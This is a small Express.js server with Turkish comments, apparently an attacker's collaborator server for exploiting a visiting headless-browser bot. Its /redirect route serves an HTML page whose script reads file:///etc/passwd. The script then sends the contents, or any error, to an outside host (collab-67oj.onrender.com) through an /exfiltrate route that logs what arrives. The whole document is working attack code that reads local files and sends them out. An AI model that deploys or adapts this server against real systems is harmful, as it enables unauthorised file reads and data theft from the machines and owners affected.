const express = require('express');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get('/redirect', (req, res) => {
    console.log("\n--- BOT Yakalandı! File Read Payload Gönderiliyor ---");
    
    const htmlPayload = `
    <html>
      <body>
        <h2>Loading...</h2>
        <script>
          // Linux sistemler için klasik /etc/passwd dosyası veya test dosyaları
          const targetInternalUrl = "file:///etc/passwd";
          
          fetch(targetInternalUrl)
            .then(response => response.text())
            .then(data => {
               // Başarılı olursa içeriği exfiltrate rotasına post ediyoruz
               fetch('https://collab-67oj.onrender.com/exfiltrate?success=true&data=' + encodeURIComponent(data));
            })
            .catch(error => {
               // Hata durumunda hatayı yakalıyoruz
               fetch('https://collab-67oj.onrender.com/exfiltrate?success=false&error=' + encodeURIComponent(error.toString()));
            });
        </script>
      </body>
    </html>
    `;

    res.setHeader('Content-Type', 'text/html');
    return res.status(200).send(htmlPayload);
});

app.get('/exfiltrate', (req, res) => {
    console.log("\n🔥 --- FILE READ / SIZDIRMA YANITI --- 🔥");
    console.log("Query Parametreleri:", req.query);
    return res.status(200).send("OK");
});

app.use((req, res) => {
    return res.status(200).send("OK");
});

app.listen(3000, () => console.log("Collaborator 3000 portunda hazır!"));
